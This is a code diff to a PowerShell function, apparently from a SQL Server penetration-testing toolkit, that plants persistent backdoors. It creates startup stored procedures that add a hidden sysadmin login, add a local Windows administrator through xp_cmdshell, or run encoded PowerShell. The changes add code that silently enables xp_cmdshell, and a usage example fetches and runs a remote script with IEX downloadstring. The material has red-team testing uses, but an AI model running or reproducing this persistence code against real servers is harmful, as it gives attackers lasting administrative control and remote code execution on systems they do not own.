@@ -1,4 +1,4 @@
-function Invoke-SqlServer-Persist-AutrunSp
+function Invoke-SqlServer-Backdoor-AutrunSp
 {
     <#
 	.SYNOPSIS
@@ -17,19 +17,19 @@ function Invoke-SqlServer-Persist-AutrunSp
 	.EXAMPLE
 	Create startup stored procedure to add a new sysadmin.  The example shows the script being run using a SQL Login.
 
-	PS C:\> Invoke-SqlServer-Persist-AutrunSp -SqlServerInstance "SERVERNAME\INSTANCENAME" -SqlUser MySQLAdmin -SqlPass MyPassword123! -NewSqlUser mysqluser -NewSqlPass NewPassword123! 
+	PS C:\> Invoke-SqlServer-Backdoor-AutrunSp -SqlServerInstance "SERVERNAME\INSTANCENAME" -SqlUser MySQLAdmin -SqlPass MyPassword123! -NewSqlUser mysqluser -NewSqlPass NewPassword123! 
 
 	.EXAMPLE
 	Create startup stored procedure to add a local administrator to the Windows OS via xp_cmdshell.  The example shows the script 
 	being run as the current windows user.
 
-	PS C:\> Invoke-SqlServer-Persist-AutrunSp -SqlServerInstance "SERVERNAME\INSTANCENAME" -NewOsUser myosuser -NewOsPass NewPassword123!
+	PS C:\> Invoke-SqlServer-Backdoor-AutrunSp -SqlServerInstance "SERVERNAME\INSTANCENAME" -NewOsUser myosuser -NewOsPass NewPassword123!
 
 	.EXAMPLE
 	Create startup stored procedure to run a PowerShell command via xp_cmdshell. The example below downloads a PowerShell script and 
 	from the internet and executes it.  The example shows the script being run as the current Windows user.
 
-	PS C:\> Invoke-SqlServer-Persist-AutrunSp -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -PsCommand "IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1')"
+	PS C:\> Invoke-SqlServer-Backdoor-AutrunSp -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -PsCommand "IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1')"
 
 	.LINK
 	   http://www.netspi.com
@@ -47,13 +47,7 @@ function Invoke-SqlServer-Persist-AutrunSp
         - The procedures can also be removed with tsql below.
             drop proc sp_add_osadmin
             drop proc sp_add_sysadmin
-            drop proc sp_add_pscmd   
-
-	.TODO
-	   - enable xp_cmdshell
-       - add local admin check for local admin add
-       - add local admin check for pscmd
-        	   
+            drop proc sp_add_pscmd           	   
     #>
 
   [CmdletBinding()]
@@ -118,12 +112,13 @@ function Invoke-SqlServer-Persist-AutrunSp
      }
 
 
-    # -----------------------------------------------
+    # -------------------------------------------------------
     # Test database connection
-    # -----------------------------------------------
+    # -------------------------------------------------------
+
     try{
         $conn.Open()
-        Write-Host "[*] Connected." -foreground "green"
+        Write-Host "[*] Connected." 
         $conn.Close()
     }catch{
         $ErrorMessage = $_.Exception.Message
@@ -133,9 +128,9 @@ function Invoke-SqlServer-Persist-AutrunSp
     }
 
 
-    # -----------------------------------------------
+    # -------------------------------------------------------
     # Check if the user is a sysadmin
-    # -----------------------------------------------
+    # -------------------------------------------------------
 
     # Open db connection
     $conn.Open()
@@ -156,7 +151,7 @@ function Invoke-SqlServer-Persist-AutrunSp
 
         $Checksysadmin = $_.sysstatus
         if ($Checksysadmin -ne 0){
-            Write-Host "[*] Confirmed Sysadmin access." -foreground "green"                             
+            Write-Host "[*] Confirmed Sysadmin access."                             
         }else{
             Write-Host "[*] The current user does not have sysadmin privileges." -foreground "red"
             Write-Host "[*] Sysadmin privileges are required." -foreground "red"
@@ -167,6 +162,125 @@ function Invoke-SqlServer-Persist-AutrunSp
     # Close db connection
     $conn.Close()
 
+    # -------------------------------------------------------
+    # Enabled Show Advanced Options - needed for xp_cmdshell
+    # ------------------------------------------------------- 
+    
+    # Status user
+    Write-Host "[*] Enabling 'Show Advanced Options', if required..."
+    
+    # Open db connection
+    $conn.Open()
+
+    # Setup query 
+    $Query = "IF (select value_in_use from sys.configurations where name = 'Show Advanced Options') = 0
+    EXEC ('sp_configure ''Show Advanced Options'',1;RECONFIGURE')"
+
+    # Execute query 
+    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+    $results = $cmd.ExecuteReader() 
+        
+    # Close db connection
+    $conn.Close()    
+    
+
+    # -------------------------------------------------------
+    # Enabled xp_cmdshell - needed for os commands
+    # -------------------------------------------------------
+
+    Write-Host "[*] Enabling 'xp_cmdshell', if required..."  
+    
+    # Open db connection
+    $conn.Open()
+
+    # Setup query 
+    $Query = "IF (select value_in_use from sys.configurations where name = 'xp_cmdshell') = 0
+    EXEC ('sp_configure ''xp_cmdshell'',1;RECONFIGURE')"
+
+    # Execute query 
+    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+    $results = $cmd.ExecuteReader() 
+        
+    # Close db connection
+    $conn.Close()  
+
+
+    # -------------------------------------------------------
+    # Check if the service account is local admin
+    # -------------------------------------------------------
+    
+    Write-Host "[*] Checking if service account is a local administrator..."  
+
+    # Open db connection
+    $conn.Open()
+
+    # Setup query 
+    $Query = @"
+
+                        -- Setup reg path 
+                        DECLARE @SQLServerInstance varchar(250)  
+                        if @@SERVICENAME = 'MSSQLSERVER'
+                        BEGIN											
+                            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
+                        END						
+                        ELSE
+                        BEGIN
+                            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))		
+                        END
+
+                        -- Grab service account from service's reg path
+                        DECLARE @ServiceaccountName varchar(250)  
+                        EXECUTE master.dbo.xp_instance_regread  
+                        N'HKEY_LOCAL_MACHINE', @SQLServerInstance,  
+                        N'ObjectName',@ServiceAccountName OUTPUT, N'no_output' 
+
+                        DECLARE @MachineType  SYSNAME
+                        EXECUTE master.dbo.xp_regread
+                        @rootkey      = N'HKEY_LOCAL_MACHINE',
+                        @key          = N'SYSTEM\CurrentControlSet\Control\ProductOptions',
+                        @value_name   = N'ProductType', 
+                        @value        = @MachineType output
+                        
+                        -- Grab more info about the server
+                        SELECT @ServiceAccountName as SvcAcct
+"@
+
+    # Execute query
+    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+    $results = $cmd.ExecuteReader() 
+
+    # Parse query results
+    $TableServiceAccount = New-Object System.Data.DataTable
+    $TableServiceAccount.Load($results)  
+    $SqlServeServiceAccountDirty = $TableServiceAccount | select SvcAcct -ExpandProperty SvcAcct 
+    $SqlServeServiceAccount = $SqlServeServiceAccountDirty -replace '\.\\',''
+        
+    # Close db connection
+    $conn.Close() 
+
+    # Open db connection
+    $conn.Open()
+
+    # Setup query 
+    $Query = "EXEC master..xp_cmdshell 'net localgroup Administrators';"
+
+    # Execute query 
+    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+    $results = $cmd.ExecuteReader() 
+
+    # Parse query results
+    $TableServiceAccountPriv = New-Object System.Data.DataTable
+    $TableServiceAccountPriv.Load($results)  
+        
+    # Close db connection
+    $conn.Close()  
+    if($SqlServeServiceAccount -eq "LocalSystem" -or $TableServiceAccountPriv -contains "$SqlServeServiceAccount"){
+        Write-Host "[*] The service account $SqlServeServiceAccount has local administrator privileges."  
+        $SvcAdmin = 1
+    }else{
+        Write-Host "[*] The service account $SqlServeServiceAccount does NOT have local administrator privileges." 
+        $SvcAdmin = 0 
+    }
    
     # -------------------------------------------------------
     # Create startup stored procedure to run PowerShell code
@@ -175,7 +289,12 @@ function Invoke-SqlServer-Persist-AutrunSp
      if($PsCommand){
 
         # Status user
-        Write-Host "[*] Creating a stored procedure to run PowerShell code..." -foreground "green" 
+        Write-Host "[*] Creating a stored procedure to run PowerShell code..." -foreground "green"
+        
+        # Check for local administrator privs 
+        if($SvcAdmin -eq 0){
+            Write-Host "[*] Note: The PowerShell wont be able to take administrative actions." -foreground "green"
+        }
         
         # ---------------------------
         # Create procedure
@@ -197,13 +316,13 @@ function Invoke-SqlServer-Persist-AutrunSp
             # Open db connection
             $conn.Open()
 
-            # Setup query - create procedure
+            # Setup query
             $Query = "IF NOT EXISTS (SELECT * FROM sys.objects WHERE type = 'P' AND OBJECT_ID = OBJECT_ID('dbo.sp_add_pscmd'))
             exec('CREATE PROCEDURE sp_add_pscmd
             AS
             EXEC master..xp_cmdshell ''PowerShell -enc $EncodedCommand''');"
 
-            # Execute query - create procedure
+            # Execute query
             $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
             $results = $cmd.ExecuteReader() 
         
@@ -242,49 +361,55 @@ function Invoke-SqlServer-Persist-AutrunSp
     
      if($NewOsUser){
 
-        # Status user
-        Write-Host "[*] Creating a stored procedure to create a os administrator..." -foreground "green" 
+        # Check for local administrator privs 
+        if($SvcAdmin -eq 0){
+            Write-Host "[*] sp_add_osadmin will not be created because the service account does not have local administrator privileges." 
+        }else{
         
-        # ---------------------------
-        # Create procedure
-        # ---------------------------
+            # Status user
+            Write-Host "[*] Creating a stored procedure to create a os administrator..." -foreground "green" 
 
-        # Open db connection
-        $conn.Open()
+            # ---------------------------
+            # Create procedure
+            # ---------------------------
 
-        # Setup query - create procedure
-        $Query = "IF NOT EXISTS (SELECT * FROM sys.objects WHERE type = 'P' AND OBJECT_ID = OBJECT_ID('dbo.sp_add_osadmin'))
-        exec('CREATE PROCEDURE sp_add_osadmin 
-        AS
-        EXEC master..xp_cmdshell ''net user $NewOsUser $NewOsPass /add & net localgroup administrators /add $NewOsUser''');"
+            # Open db connection
+            $conn.Open()
 
-        # Execute query - create procedure
-        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
-        $results = $cmd.ExecuteReader() 
+            # Setup query 
+            $Query = "IF NOT EXISTS (SELECT * FROM sys.objects WHERE type = 'P' AND OBJECT_ID = OBJECT_ID('dbo.sp_add_osadmin'))
+            exec('CREATE PROCEDURE sp_add_osadmin 
+            AS
+            EXEC master..xp_cmdshell ''net user $NewOsUser $NewOsPass /add & net localgroup administrators /add $NewOsUser''');"
+
+            # Execute query - create procedure
+            $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+            $results = $cmd.ExecuteReader() 
         
-        # Close db connection
-        $conn.Close()       
+            # Close db connection
+            $conn.Close()       
  
-        # ---------------------------
-        # Mark procedure for startup
-        # ---------------------------
+            # ---------------------------
+            # Mark procedure for startup
+            # ---------------------------
         
-        # Open db connection
-        $conn.Open()
+            # Open db connection
+            $conn.Open()
 
-        # Setup query - mark procedure for startup
-        $Query = "EXEC sp_procoption @ProcName = 'sp_add_osadmin',
-        @OptionName = 'startup',
-        @OptionValue = 'on';"
+            # Setup query 
+            $Query = "EXEC sp_procoption @ProcName = 'sp_add_osadmin',
+            @OptionName = 'startup',
+            @OptionValue = 'on';"
 
-        # Execute query - mark procedure for startup
-        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
-        $results = $cmd.ExecuteReader() 
+            # Execute query 
+            $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+            $results = $cmd.ExecuteReader() 
 
-        # Close db connection
-        $conn.Close()  
+            # Close db connection
+            $conn.Close()  
         
-         Write-Host "[*] Startup stored procedure sp_add_osadmin was created to add os admin $NewOsUser with password $NewOSPass." -foreground "green"      
+             Write-Host "[*] Startup stored procedure sp_add_osadmin was created to add os admin $NewOsUser with password $NewOSPass." -foreground "green" 
+        }     
     }else{
         Write-Host "[*] sp_add_osadmin will not be created because NewOsUser and NewOsPass were not provided." 
     } 
@@ -305,14 +430,14 @@ function Invoke-SqlServer-Persist-AutrunSp
         # Open db connection
         $conn.Open()
 
-        # Setup query - create procedure
+        # Setup query 
         $Query = "IF NOT EXISTS (SELECT * FROM sys.objects WHERE type = 'P' AND OBJECT_ID = OBJECT_ID('dbo.sp_add_sysadmin'))
         exec('CREATE PROCEDURE sp_add_sysadmin
         AS
         CREATE LOGIN $NewSqlUser WITH PASSWORD = ''$NewSqlPass'';
         EXEC sp_addsrvrolemember ''$NewSqlUser'', ''sysadmin'';')"
 
-        # Execute query - create procedure
+        # Execute query 
         $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
         $results = $cmd.ExecuteReader() 
         
@@ -326,7 +451,7 @@ function Invoke-SqlServer-Persist-AutrunSp
         # Open db connection
         $conn.Open()
 
-        # Setup query - mark procedure for startup
+        # Setup query 
         $Query = "EXEC sp_procoption @ProcName = 'sp_add_sysadmin',
         @OptionName = 'startup',
         @OptionValue = 'on';"
